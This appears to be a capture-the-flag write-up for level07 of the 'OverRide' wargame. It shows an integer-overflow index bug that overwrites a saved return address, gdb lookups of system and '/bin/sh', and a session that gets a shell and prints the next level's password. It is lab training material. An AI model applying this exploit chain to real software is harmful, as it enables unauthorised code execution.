@@ -1,0 +1,88 @@
+In this level provide a set of commands to execute:
+- store : store a number at a given index
+- read : read a number from a given index
+- quit : exit the program
+
+the program does not check the index if it is valid, only check if it is
+divisible by 3 and does not have 0xbf in the highest byte
+
+so we can try to override the EIP that is located after the int data array
+but this index is divisible by 3 so we need to give a number that only gives 114 (after overflow)
+so that we can erase the EIP
+
+we can give 2 ^ 30 + 114 since after shifting by 2 to the left (to make the index valid for int array)
+it will become 456 (114 * 4) and erase the EIP
+
+all what we need now is finding address of system and address of "/bin/sh"
+
+for "/bin/sh" :
+
+(gdb) info proc mappings
+process 3599
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
+	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
+	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
+	0xf7e2b000 0xf7e2c000     0x1000        0x0
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0
+	0xf7fd8000 0xf7fdb000     0x3000        0x0
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+
+for system :
+
+(gdb) x system
+0xf7e6aed0 <system>:	 "\203\354\034\211t$\024\213t$ \211\\$\020菮\016"
+(gdb) p 0xf7e6aed0
+$1 = 4159090384
+(gdb) p 0xf7f897ec
+$2 = 4160264172
+
+for 2^30 + 114 it is equl to 1073741938
+
+we need to store system at index 114 (1073741938), "/bin/sh" in index 116 (we can also store exit address in index 115 to exit gracefully after exiting the shell)
+
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: quit
+$ cd ../level08
+$ cat .pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+$ exit
+level07@OverRide:~$
